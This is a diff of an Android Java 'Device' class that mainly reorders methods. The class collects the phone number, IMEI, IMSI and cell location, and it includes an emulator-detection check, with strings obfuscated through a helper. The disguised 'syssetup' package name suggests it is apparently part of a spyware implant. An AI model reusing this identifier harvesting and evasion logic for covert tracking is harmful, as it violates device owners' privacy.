@@ -15,27 +15,28 @@ import android.telephony.TelephonyManager;
 import android.telephony.cdma.CdmaCellLocation;
 import android.telephony.gsm.GsmCellLocation;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.util.ByteArray;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
 
 // TODO: Auto-generated Javadoc
+
 /**
  * The Class Device.
  */
 public class Device {
-	private static final String TAG = "Device"; //$NON-NLS-1$
-
 	public static final String UNKNOWN_NUMBER = "";
-
-	/** The singleton. */
+	private static final String TAG = "Device"; //$NON-NLS-1$
+	/**
+	 * The singleton.
+	 */
 	private volatile static Device singleton;
 	private java.lang.String sdk = M.e("sdk");
 
 	/**
 	 * Self.
-	 * 
+	 *
 	 * @return the device
 	 */
 	public static Device self() {
@@ -51,54 +52,8 @@ public class Device {
 	}
 
 	/**
-	 * Gets the phone number.
-	 * 
-	 * @return the phone number
-	 */
-	public String getPhoneNumber() {
-		try {
-			TelephonyManager mTelephonyMgr;
-			mTelephonyMgr = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
-
-			String number = mTelephonyMgr.getLine1Number();
-			if (isPhoneNumber(number) ) {
-				return number;
-			}
-		} catch (Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getPhoneNumber) Error: " + ex);
-			}
-		}
-
-		return UNKNOWN_NUMBER;
-	}
-
-	private boolean isPhoneNumber(String number) {
-		if(number == null || number.length() == 0) {
-			return false;
-		}
-
-		return PhoneNumberUtils.isGlobalPhoneNumber(number);
-	}
-
-	/**
-	 * Gets the version.
-	 * 
-	 * @return the version
-	 */
-	public byte[] getVersion() {
-		final byte[] versionRet = ByteArray.intToByteArray(Version.VERSION);
-
-		if (Cfg.DEBUG) {
-			Check.ensures(versionRet.length == 4, "Wrong version len"); //$NON-NLS-1$
-		}
-
-		return versionRet;
-	}
-
-	/**
 	 * Check. if is CDMA. //$NON-NLS-1$
-	 * 
+	 *
 	 * @return true, if is CDMA
 	 */
 	public static boolean isCdma() {
@@ -107,68 +62,6 @@ public class Device {
 
 	public static boolean isGprs() {
 		return true;
-	}
-
-	public boolean isSimulator() {
-		// return getDeviceId() == "9774d56d682e549c";
-		return Build.PRODUCT.startsWith(sdk); //$NON-NLS-1$
-	}
-
-	/**
-	 * Gets the imei.
-	 * 
-	 * @return the imei
-	 */
-	public String getImei() {
-		final TelephonyManager telephonyManager;
-
-		try {
-			telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
-		} catch (Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getImei) Error: " + ex);
-			}
-
-			return "";
-		}
-
-		String imei = telephonyManager.getDeviceId();
-
-		if (imei == null || imei.length() == 0) {
-			imei = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
-			if (imei == null || imei.length() == 0) {
-				imei = M.e("N/A"); //$NON-NLS-1$
-			}
-		}
-
-		return imei;
-	}
-
-	/**
-	 * Gets the imsi.
-	 * 
-	 * @return the imsi
-	 */
-	public String getImsi() {
-		final TelephonyManager telephonyManager;
-
-		try {
-			telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
-		} catch (Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getImei) Error: " + ex);
-			}
-
-			return "";
-		}
-
-		String imsi = telephonyManager.getSubscriberId();
-
-		if (imsi == null) {
-			imsi = M.e("UNAVAILABLE"); //$NON-NLS-1$
-		}
-
-		return imsi;
 	}
 
 	public static CellInfo getCellInfo() {
@@ -192,7 +85,7 @@ public class Device {
 				Check.log(TAG + " (getCellInfo): no sim");
 			}
 			return info;
-		} 
+		}
 
 		final CellLocation bcell = tm.getCellLocation();
 
@@ -241,6 +134,114 @@ public class Device {
 		}
 
 		return info;
+	}
+
+	/**
+	 * Gets the phone number.
+	 *
+	 * @return the phone number
+	 */
+	public String getPhoneNumber() {
+		try {
+			TelephonyManager mTelephonyMgr;
+			mTelephonyMgr = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
+
+			String number = mTelephonyMgr.getLine1Number();
+			if (isPhoneNumber(number)) {
+				return number;
+			}
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getPhoneNumber) Error: " + ex);
+			}
+		}
+
+		return UNKNOWN_NUMBER;
+	}
+
+	private boolean isPhoneNumber(String number) {
+		if (number == null || number.length() == 0) {
+			return false;
+		}
+
+		return PhoneNumberUtils.isGlobalPhoneNumber(number);
+	}
+
+	/**
+	 * Gets the version.
+	 *
+	 * @return the version
+	 */
+	public byte[] getVersion() {
+		final byte[] versionRet = ByteArray.intToByteArray(Version.VERSION);
+
+		if (Cfg.DEBUG) {
+			Check.ensures(versionRet.length == 4, "Wrong version len"); //$NON-NLS-1$
+		}
+
+		return versionRet;
+	}
+
+	public boolean isSimulator() {
+		// return getDeviceId() == "9774d56d682e549c";
+		return Build.PRODUCT.startsWith(sdk); //$NON-NLS-1$
+	}
+
+	/**
+	 * Gets the imei.
+	 *
+	 * @return the imei
+	 */
+	public String getImei() {
+		final TelephonyManager telephonyManager;
+
+		try {
+			telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getImei) Error: " + ex);
+			}
+
+			return "";
+		}
+
+		String imei = telephonyManager.getDeviceId();
+
+		if (imei == null || imei.length() == 0) {
+			imei = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
+			if (imei == null || imei.length() == 0) {
+				imei = M.e("N/A"); //$NON-NLS-1$
+			}
+		}
+
+		return imei;
+	}
+
+	/**
+	 * Gets the imsi.
+	 *
+	 * @return the imsi
+	 */
+	public String getImsi() {
+		final TelephonyManager telephonyManager;
+
+		try {
+			telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getImei) Error: " + ex);
+			}
+
+			return "";
+		}
+
+		String imsi = telephonyManager.getSubscriberId();
+
+		if (imsi == null) {
+			imsi = M.e("UNAVAILABLE"); //$NON-NLS-1$
+		}
+
+		return imsi;
 	}
 
 }
